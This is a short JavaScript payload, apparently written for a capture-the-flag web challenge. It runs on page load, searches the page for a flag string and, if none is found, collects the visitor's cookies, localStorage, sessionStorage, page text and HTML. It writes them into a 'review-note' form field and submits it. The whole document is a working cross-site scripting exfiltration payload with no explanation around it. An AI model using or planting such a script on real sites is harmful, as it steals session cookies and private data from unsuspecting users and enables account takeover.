(() => {
  function submitReviewNote() {
    const form = document.getElementById('review-note');
    if (!form) return;

    const html = document.documentElement.innerHTML;
    const text = document.body ? document.body.innerText : '';
    const match = `${text}\n${html}`.match(/(?:firebird|flag|ctf)\{[^}]+\}/i);
    const storage = {
      local: { ...localStorage },
      session: { ...sessionStorage },
    };
    const note = form.elements.namedItem('note');
    if (!note) return;
    note.value = (match
      ? match[0]
      : [document.cookie, JSON.stringify(storage), text, html].join('\n')
    ).slice(0, 6000);
    form.submit();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', submitReviewNote, { once: true });
  } else {
    submitReviewNote();
  }
})();
